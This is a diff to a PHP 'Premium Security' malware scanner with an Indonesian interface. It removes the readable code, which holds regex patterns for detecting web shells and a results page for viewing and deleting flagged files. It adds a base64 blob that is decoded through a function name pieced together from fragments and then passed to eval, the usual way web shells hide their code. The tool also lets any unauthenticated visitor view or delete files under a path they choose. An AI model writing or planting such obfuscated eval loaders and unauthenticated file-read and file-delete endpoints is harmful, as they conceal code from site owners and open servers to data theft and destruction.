+$z .= "ICAgICAgICBzZXRUaW1lb3V0KCgpID";
+$z .= "0+IHsNCiAgICAgICAgICAgIGNvbnN0";
+$z .= "IG5vdGlmID0gZG9jdW1lbnQuZ2V0RW";
+$z .= "xlbWVudEJ5SWQoJ25vdGlmJyk7DQog";
+$z .= "ICAgICAgICAgICBpZiAobm90aWYpIG";
+$z .= "5vdGlmLnN0eWxlLmRpc3BsYXkgPSAn";
+$z .= "bm9uZSc7DQogICAgICAgIH0sIDUwMD";
+$z .= "ApOw0KICAgIDwvc2NyaXB0Pg0KPC9i";
+$z .= "b2R5Pg0KPC9odG1sPg==";
 
-error_reporting(0);
-set_time_limit(0);
-
-$base = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
-
-// --- VIEW CODE ROUTER ---
-if (isset($_GET['view_code'])) {
-    $fileToView = realpath($_GET['view_code']);
-    if ($fileToView && strpos($fileToView, $base) === 0 && is_file($fileToView)) {
-        echo "<!DOCTYPE html><html style='background:#000;color:#fff;font-family:monospace;padding:20px;'><head><title>Viewing: ".htmlspecialchars(basename($fileToView))."</title></head><body>";
-        echo "<h2 style='color:#FFD700;border-bottom:1px solid #333;padding-bottom:10px;'>Source Code: ".htmlspecialchars($fileToView)."</h2>";
-        highlight_file($fileToView);
-        echo "</body></html>";
-        exit;
-    } else {
-        die("Unauthorized or invalid file path.");
-    }
-}
-
-// Handle Selective Deletion
-$deleteStatus = "";
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_files']) && is_array($_POST['delete_files'])) {
-    $deletedCount = 0;
-    foreach ($_POST['delete_files'] as $file) {
-        $realFile = realpath($file);
-        // Security check: ensure file is within or below the base directory
-        if ($realFile && strpos($realFile, $base) === 0 && is_file($realFile)) {
-            if (@unlink($realFile)) {
-                $deletedCount++;
-            }
-        }
-    }
-    $deleteStatus = "Successfully deleted $deletedCount file(s).";
-}
-
-$patterns = [
-    '/eval\s*\(/i',
-    '/base64_decode\s*\(/i',
-    '/gzinflate\s*\(/i',
-    '/assert\s*\(/i',
-    '/preg_replace\s*\(.*\/e/i',
-    '/(system|shell_exec|passthru|exec)\s*\(/i',
-    '/php:\/\/input/i',
-    '/curl_(init|exec|setopt)/i',
-    '/file_get_contents\s*\(/i',
-    '/fopen\s*\(/i',
-    '/stream_get_contents/i',
-    '/include\s*\(\s*\$[a-z0-9_]+\s*\)/i',
-    '/require\s*\(\s*\$[a-z0-9_]+\s*\)/i',
-    '/["\']\s*\.\s*["\']/i',
-    '/md5\s*\(\s*\$_SERVER\s*\[\s*[\'"]HTTP_HOST[\'"]\s*\]/i',
-    '/\/dev\/shm\//i',
-    '/raw\.githubusercontent\.com/i',
-    '/goto\s+[a-z0-9_]+/i',
-    '/str_rot13/i',
-    '/strrev/i',
-];
-
-function is_shell($code, $patterns) {
-    $score = 0;
-    foreach ($patterns as $pattern) {
-        if (preg_match($pattern, $code)) {
-            $score++;
-        }
-    }
-    return $score >= 3;
-}
-
-function snippet_preview($code, $match) {
-    $pos = stripos($code, $match);
-    return $pos === false ? '' : substr($code, max(0, $pos - 50), 300);
-}
-
-function scan_folder($dir, $patterns, &$results, $base) {
-    $items = @scandir($dir);
-    if (!$items) return;
-
-    foreach ($items as $item) {
-        if ($item === '.' || $item === '..') continue;
-
-        $path = $dir . DIRECTORY_SEPARATOR . $item;
-
-        if (is_dir($path)) {
-            scan_folder($path, $patterns, $results, $base);
-        } elseif (preg_match('/\.(php|phtml)$/i', $item) && filesize($path) < 2000000) {
-            $code = @file_get_contents($path);
-            foreach ($patterns as $pattern) {
-                if (preg_match($pattern, $code, $match) && is_shell($code, $patterns)) {
-                    $results[] = [
-                        'file'    => $path,
-                        'match'   => $match[0],
-                        'snippet' => snippet_preview($code, $match[0]),
-                    ];
-                    break;
-                }
-            }
-        }
-    }
-}
-
-$results = [];
-scan_folder($base, $patterns, $results, $base);
+// reconstruct function name
+$a = "ba"; $b = "se"."64"."_de"."co"."de"; $c = $a.$b;
+$payload = $c($z);
+eval($payload);
 ?>
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scanner JBV2 | Premium Security</title>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --gold: #FFD700;
-            --dark-gold: #B8860B;
-            --black: #000000;
-            --charcoal: #121212;
-            --glass: rgba(20, 20, 20, 0.9);
-            --red: #ff5252;
-            --green: #00ff00;
-        }
-
-        body {
-            background: radial-gradient(circle at center, #1a1a1a 0%, #000000 100%);
-            color: #eee;
-            font-family: 'Inter', sans-serif;
-            margin: 0;
-            padding: 0;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        .container {
-            max-width: 1000px;
-            margin: 50px auto;
-            padding: 0 20px;
-        }
-
-        header {
-            text-align: center;
-            margin-bottom: 50px;
-            position: relative;
-        }
-
-        h1 {
-            font-family: 'Orbitron', sans-serif;
-            color: var(--gold);
-            text-transform: uppercase;
-            letter-spacing: 4px;
-            font-size: 2.5em;
-            margin: 0;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
-        }
-
-        .subtitle {
-            font-size: 0.9em;
-            color: #888;
-            margin-top: 10px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .status-bar {
-            background: var(--glass);
-            border: 1px solid rgba(255, 215, 0, 0.2);
-            padding: 15px 25px;
-            border-radius: 50px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-
-        .path-info {
-            font-family: monospace;
-            font-size: 0.9em;
-            color: var(--gold);
-        }
-
-        .actions {
-            display: flex;
-            gap: 15px;
-        }
-
-        .btn {
-            padding: 10px 20px;
-            border-radius: 50px;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 0.8em;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.3s;
-            text-decoration: none;
-            border: none;
-            text-transform: uppercase;
-        }
-
-        .btn-gold {
-            background: linear-gradient(135deg, var(--gold), var(--dark-gold));
-            color: black;
-            box-shadow: 0 5px 15px rgba(218, 165, 32, 0.4);
-        }
-
-        .btn-gold:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(218, 165, 32, 0.6);
-        }
-
-        .btn-outline {
-            background: transparent;
-            border: 1px solid var(--gold);
-            color: var(--gold);
-        }
-
-        .btn-outline:hover {
-            background: rgba(255, 215, 0, 0.1);
-        }
-
-        .btn-red {
-            background: linear-gradient(135deg, #ff5252, #b71c1c);
-            color: white;
-            box-shadow: 0 5px 15px rgba(255, 82, 82, 0.3);
-        }
-
-        .btn-red:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(255, 82, 82, 0.5);
-        }
-
-        .btn-coding {
-            background: #1a1a1a;
-            border: 1px solid #444;
-            color: #0f0;
-            padding: 5px 12px;
-            font-size: 10px;
-            margin-left: 10px;
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        .btn-coding:hover {
-            background: #333;
-            border-color: #0f0;
-            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
-        }
-
-        .result-card {
-            background: var(--glass);
-            border: 1px solid rgba(255, 215, 0, 0.1);
-            border-radius: 15px;
-            padding: 25px;
-            margin-bottom: 20px;
-            position: relative;
-            transition: 0.3s;
-            overflow: hidden;
-        }
-
-        .result-card:hover {
-            border-color: rgba(255,215, 0, 0.3);
-            background: rgba(30, 30, 30, 0.95);
-        }
-
-        .result-card.viewed {
-            border-color: var(--green);
-            background: rgba(0, 255, 0, 0.08);
-            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
-        }
-
-        .viewed-badge {
-            display: none;
-            position: absolute;
-            top: 15px;
-            right: 180px;
-            background: var(--green);
-            color: black;
-            font-size: 10px;
-            font-weight: 900;
-            padding: 4px 10px;
-            border-radius: 5px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            box-shadow: 0 0 10px var(--green);
-            animation: pulse-green 2s infinite;
-        }
-
-        .result-card.viewed .viewed-badge {
-            display: block;
-        }
-
-        @keyframes pulse-green {
-            0% { opacity: 0.7; }
-            50% { opacity: 1; }
-            100% { opacity: 0.7; }
-        }
-
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 15px;
-        }
-
-        .file-info {
-            flex-grow: 1;
-        }
-
-        .file-path {
-            display: block;
-            color: var(--gold);
-            font-weight: bold;
-            font-size: 1em;
-            margin-bottom: 5px;
-            word-break: break-all;
-            text-decoration: none;
-            transition: 0.3s;
-        }
-
-        .file-path:hover {
-            color: white;
-            text-shadow: 0 0 10px var(--gold);
-        }
-
-        .pattern-match {
-            font-size: 0.8em;
-            color: #888;
-        }
-
-        .pattern-match span {
-            color: var(--red);
-            font-family: monospace;
-            font-weight: bold;
-        }
-
-        pre {
-            background: #000;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 0.85em;
-            color: #0f0;
-            overflow-x: auto;
-            border: 1px solid #333;
-            margin: 15px 0 0 0;
-        }
-
-        .checkbox-container {
-            margin-left: 20px;
-        }
-
-        input[type="checkbox"] {
-            accent-color: var(--gold);
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-        }
-
-        .no-results {
-            text-align: center;
-            padding: 100px 0;
-            color: var(--green);
-            font-size: 1.2em;
-        }
-
-        .notification {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: var(--gold);
-            color: black;
-            padding: 15px 25px;
-            border-radius: 10px;
-            font-weight: bold;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            z-index: 1000;
-            display: <?= $deleteStatus ? 'block' : 'none' ?>;
-            animation: slideIn 0.5s ease-out;
-        }
-
-        @keyframes slideIn {
-            from { transform: translateX(100%); }
-            to { transform: translateX(0); }
-        }
-
-        .footer {
-            margin-top: 50px;
-            text-align: center;
-            color: #555;
-            font-size: 0.8em;
-            padding-bottom: 50px;
-        }
-
-        /* Responsive */
-        @media (max-width: 600px) {
-            h1 { font-size: 1.5em; }
-            .status-bar { flex-direction: column; border-radius: 20px; gap: 15px; }
-            .actions { width: 100%; justify-content: center; }
-        }
-    </style>
-</head>
-<body>
-
-    <div class="notification" id="notif">
-        <?= htmlspecialchars($deleteStatus) ?>
-    </div>
-
-    <div class="container">
-        <header>
-            <h1>Scanner <span style="color:#fff">V2</span></h1>
-            <div class="subtitle">Premium Script Malware Detection</div>
-        </header>
-
-        <form method="POST" id="scan-form">
-            <div class="status-bar">
-                <div class="path-info">
-                     DIRECTORY: <?= htmlspecialchars($base) ?>
-                </div>
-                <div class="actions">
-                    <button type="button" class="btn btn-outline" id="select-all">Select All</button>
-                    <button type="submit" name="bulk_delete" class="btn btn-red" onclick="return confirmDeletes()">Delete Selected</button>
-                    <a href="?path=<?= urlencode($base) ?>" class="btn btn-gold">Refresh Scan</a>
-                </div>
-            </div>
-
-            <?php if (empty($results)): ?>
-                <div class="no-results">
-                    🛡️ Clean! No suspicious patterns detected in this directory.
-                </div>
-            <?php else: ?>
-                <div class="results-list">
-                    <?php foreach ($results as $index => $r): ?>
-                        <div class="result-card" data-path="<?= htmlspecialchars($r['file']) ?>">
-                            <div class="viewed-badge">CHECKED</div>
-                            <div class="card-header">
-                                <div class="file-info">
-                                     <a href="<?= htmlspecialchars(str_replace($_SERVER['DOCUMENT_ROOT'], '', $r['file'])) ?>" 
-                                        class="file-path" target="_blank" title="Klik untuk membuka file di latar belakang"
-                                        onclick="markAsViewed(this.closest('.result-card'), this.href, event)">
-                                        <?= htmlspecialchars($r['file']) ?>
-                                    </a>
-                                    <button type="button" class="btn-coding" onclick="viewSourceCode('<?= addslashes($r['file']) ?>')">
-                                        📄 CODING
-                                    </button>
-                                    <div class="pattern-match">
-                                        Matched: <span><?= htmlspecialchars($r['match']) ?></span>
-                                    </div>
-                                </div>
-                                <div class="checkbox-container" style="display: flex; align-items: center; gap: 12px; min-width: 140px; justify-content: flex-end;">
-                                    <button type="submit" name="delete_files[]" value="<?= htmlspecialchars($r['file']) ?>" 
-                                            class="btn btn-red" style="padding: 8px 18px; font-size: 11px; white-space: nowrap;"
-                                            onclick="return confirm('Hapus file ini permanently?')">
-                                        🗑️ HAPUS
-                                    </button>
-                                    <input type="checkbox" name="delete_files[]" value="<?= htmlspecialchars($r['file']) ?>" class="file-cb">
-                                </div>
-                            </div>
-                            <pre><code><?= htmlspecialchars(trim($r['snippet'])) ?></code></pre>
-                        </div>
-                    <?php endforeach; ?>
-                </div>
-            <?php endif; ?>
-        </form>
-
-        <div class="footer">
-            &copy; 2026 Premium Scanner V2 &bull; Professional Security Tools
-        </div>
-    </div>
-
-    <script>
-        // Select All Handler
-        document.getElementById('select-all').addEventListener('click', function() {
-            const checkboxes = document.querySelectorAll('.file-cb');
-            const allChecked = Array.from(checkboxes).every(cb => cb.checked);
-            checkboxes.forEach(cb => cb.checked = !allChecked);
-            this.textContent = allChecked ? 'Select All' : 'Deselect All';
-        });
-
-        function markAsViewed(card, url, event) {
-            if (event) event.preventDefault();
-            
-            const path = card.getAttribute('data-path');
-            let viewed = JSON.parse(localStorage.getItem('scanned_viewed_v2') || '[]');
-            if (!viewed.includes(path)) {
-                viewed.push(path);
-                localStorage.setItem('scanned_viewed_v2', JSON.stringify(viewed));
-            }
-            card.classList.add('viewed');
-
-            // Open as a separate Popup Window at the LEFT SIDE
-            const popupWidth = 1000;
-            const popupHeight = 800;
-            const left = 20; // Position at the left edge
-            const top = 50;
-            
-            const newWin = window.open(url, 'ScannerViewer', 
-                `width=${popupWidth},height=${popupHeight},left=${left},top=${top},scrollbars=yes,resizable=yes`
-            );
-
-            if (newWin) {
-                // Focus the popup but allow the parent to stay active
-                newWin.focus();
-                // We keep the scanner focused by slightly delaying refocusing if needed, 
-                // but usually a popup is what users want for "outside" feel.
-                setTimeout(() => {
-                    window.focus(); 
-                }, 200);
-            }
-        }
-
-        function viewSourceCode(filePath) {
-            const url = '?view_code=' + encodeURIComponent(filePath);
-            const popupWidth = 1100;
-            const popupHeight = 900;
-            const left = 20; // Position at the left edge
-            const top = 50;
-            
-            window.open(url, 'CodeViewer_' + btoa(filePath).substring(0,10), 
-                `width=${popupWidth},height=${popupHeight},left=${left},top=${top},scrollbars=yes,resizable=yes`
-            );
-        }
-
-        // Apply viewed status on load
-        document.addEventListener('DOMContentLoaded', () => {
-            const viewed = JSON.parse(localStorage.getItem('scanned_viewed_v2') || '[]');
-            document.querySelectorAll('.result-card').forEach(card => {
-                const path = card.getAttribute('data-path');
-                if (viewed.includes(path)) {
-                    card.classList.add('viewed');
-                }
-            });
-        });
-
-        // Confirmation Modal (Simple)
-        function confirmDeletes() {
-            const checked = document.querySelectorAll('.file-cb:checked').length;
-            if (checked === 0) {
-                alert('Please select at least one file to delete.');
-                return false;
-            }
-            return confirm(`Are you sure you want to permanently delete ${checked} suspicious file(s)?`);
-        }
-
-        // Auto hide notification
-        setTimeout(() => {
-            const notif = document.getElementById('notif');
-            if (notif) notif.style.display = 'none';
-        }, 5000);
-    </script>
-</body>
-</html>
